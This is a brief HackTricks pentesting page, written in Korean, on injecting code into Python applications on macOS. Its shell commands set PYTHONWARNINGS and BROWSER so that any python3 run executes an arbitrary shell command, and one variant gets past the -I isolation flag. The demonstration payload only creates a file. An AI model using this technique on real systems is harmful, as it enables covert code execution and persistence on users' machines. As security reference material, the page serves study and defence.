# macOS Python Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PYTHONWARNINGS` 및 `BROWSER` 환경 변수를 통한 방법

python이 호출될 때마다 임의의 코드를 실행하기 위해 두 환경 변수를 모두 변경하는 것이 가능합니다. 예를 들어:
```bash
# Generate example python script
echo "print('hi')" > /tmp/script.py

# RCE which will generate file /tmp/hacktricks
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
{{#include ../../../banners/hacktricks-training.md}}
